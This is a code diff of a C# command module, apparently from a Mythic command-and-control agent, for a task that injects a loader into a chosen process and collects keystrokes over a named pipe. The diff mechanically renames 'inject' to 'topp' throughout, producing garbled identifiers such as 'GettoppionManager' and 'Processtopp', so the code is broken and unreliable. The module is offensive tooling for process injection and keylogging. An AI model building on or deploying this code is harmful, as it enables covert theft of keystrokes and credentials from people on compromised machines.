@@ -1,10 +1,10 @@
 ﻿#define COMMAND_NAME_UPPER
 
 #if DEBUG
-#define KEYLOG_INJECT
+#define KEYLOG_topp
 #endif
 
-#if KEYLOG_INJECT
+#if KEYLOG_topp
 
 using Interop.Classes;
 using Interop.Classes.Collections;
@@ -27,10 +27,10 @@ using ST = System.Threading.Tasks;
 
 namespace Tasks
 {
-    public class keylog_inject : Tasking
+    public class keylog_topp : Tasking
     {
         [DataContract]
-        internal struct KeylogInjectParameters
+        internal struct KeylogtoppParameters
         {
             [DataMember(Name = "pipe_name")]
             public string PipeName;
@@ -56,7 +56,7 @@ namespace Tasks
 
         private bool _completed = false;
 
-        public keylog_inject(IAgent agent, Interop.Structs.MythicStructs.MythicTask data) : base(agent, data)
+        public keylog_topp(IAgent agent, Interop.Structs.MythicStructs.MythicTask data) : base(agent, data)
         {
             _putKeylogsAction = (object p) =>
             {
@@ -117,7 +117,7 @@ namespace Tasks
             MythicTaskResponse resp;
             try
             {
-                KeylogInjectParameters parameters = _jsonSerializer.Deserialize<KeylogInjectParameters>(_data.Parameters);
+                KeylogtoppParameters parameters = _jsonSerializer.Deserialize<KeylogtoppParameters>(_data.Parameters);
                 if (string.IsNullOrEmpty(parameters.LoaderStubId) ||
                     string.IsNullOrEmpty(parameters.PipeName))
                 {
@@ -144,8 +144,8 @@ namespace Tasks
                         if (_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.LoaderStubId,
                                 out byte[] exeAsmPic))
                         {
-                            var injector = _agent.GetInjectionManager().CreateInstance(exeAsmPic, parameters.PID);
-                            if (injector.topp())
+                            var toppor = _agent.GettoppionManager().CreateInstance(exeAsmPic, parameters.PID);
+                            if (toppor.topp())
                             {
                                 _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
                                     "",
@@ -153,8 +153,8 @@ namespace Tasks
                                     "",
                                     new IMythicMessage[]
                                     {
-                                        Artifact.ProcessInject(parameters.PID,
-                                            _agent.GetInjectionManager().GetCurrentTechnique().Name)
+                                        Artifact.Processtopp(parameters.PID,
+                                            _agent.GettoppionManager().GetCurrentTechnique().Name)
                                     }));
                                 AsyncNamedPipeClient client = new AsyncNamedPipeClient("127.0.0.1", parameters.PipeName);
                                 client.ConnectionEstablished += Client_ConnectionEstablished;
